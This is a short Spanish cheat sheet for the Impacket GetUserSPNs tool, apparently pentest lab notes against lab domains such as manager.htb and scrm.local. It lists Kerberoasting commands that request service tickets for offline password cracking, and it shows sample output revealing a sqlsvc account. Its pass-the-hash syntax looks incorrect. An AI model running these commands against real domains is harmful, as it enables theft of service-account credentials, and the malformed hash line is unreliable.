

```bash
impacket-GetUserSPNs manager.htb/operator:operator -request 
```

Comandos Más Usados:

1. **Listar SPNs asociados a cuentas de usuario:**

   ```bash
   GetUserSPNs.py <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Consulta el Active Directory para listar todos los SPNs asociados a cuentas de usuario.
2. **Especificar la dirección IP del Domain Controller (DC):**

   ```bash
   GetUserSPNs.py -dc-ip <IP_DC> <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Utiliza una dirección IP específica del controlador de dominio en lugar del nombre de dominio.
3. **Guardar los tickets TGS en formato de archivo:**

   ```bash
   GetUserSPNs.py -request -dc-ip <IP_DC> <dominio>/<usuario>:<contraseña>
   ```

   * **Descripción**: Solicita y guarda los tickets de servicio (TGS) en un archivo para intentar romper el cifrado de las contraseñas.
4. **Usar autenticación NTLM en lugar de contraseña:**

   ```bash
   GetUserSPNs.py <dominio>/<usuario>@<NTLM_HASH>
   ```

   * **Descripción**: Usa el hash NTLM de la contraseña para autenticarse en lugar de la contraseña en texto claro.

Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  ones specified in the command line 

``` shell
GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-01-03 16:50:42.253155             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-01-03 16:50:42.253155  
``